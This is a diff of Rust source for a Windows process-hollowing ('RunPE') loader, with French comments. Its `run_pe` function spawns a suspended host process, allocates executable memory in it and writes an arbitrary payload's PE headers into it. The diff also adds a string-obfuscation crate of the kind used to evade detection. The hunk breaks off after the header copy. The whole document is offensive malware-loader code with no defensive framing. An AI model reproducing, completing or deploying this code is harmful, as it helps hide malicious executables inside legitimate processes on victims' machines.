@@ -4,26 +4,23 @@ pub mod process;
 use std::ptr;
 use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory}; // Ajout de WriteProcessMemory
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
+use obfstr::obfstr;
 
 pub unsafe fn run_pe(payload: Vec<u8>) {
     let pi = match process::spawn_suspended_host() {
         Some(info) => info,
         None => return,
     };
-
     let dos_header = &*(payload.as_ptr() as *const IMAGE_DOS_HEADER);
     let nt_headers = &*(payload.as_ptr().offset(dos_header.e_lfanew as isize) as *const IMAGE_NT_HEADERS64);
     let section_ptr = (payload.as_ptr().offset(dos_header.e_lfanew as isize) as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
-
     let img_size = nt_headers.OptionalHeader.SizeOfImage as usize;
     let mut dest_addr = VirtualAllocEx(pi.hProcess, nt_headers.OptionalHeader.ImageBase as *mut _, img_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
     let mut delta: isize = 0;
     if dest_addr.is_null() {
         dest_addr = VirtualAllocEx(pi.hProcess, ptr::null_mut(), img_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         delta = (dest_addr as isize).wrapping_sub(nt_headers.OptionalHeader.ImageBase as isize);
     }
-
     // --- COPIE DES HEADERS ---
     let mut bw = 0;
     WriteProcessMemory(pi.hProcess, dest_addr, payload.as_ptr() as *const _, nt_headers.OptionalHeader.SizeOfHeaders as usize, &mut bw);
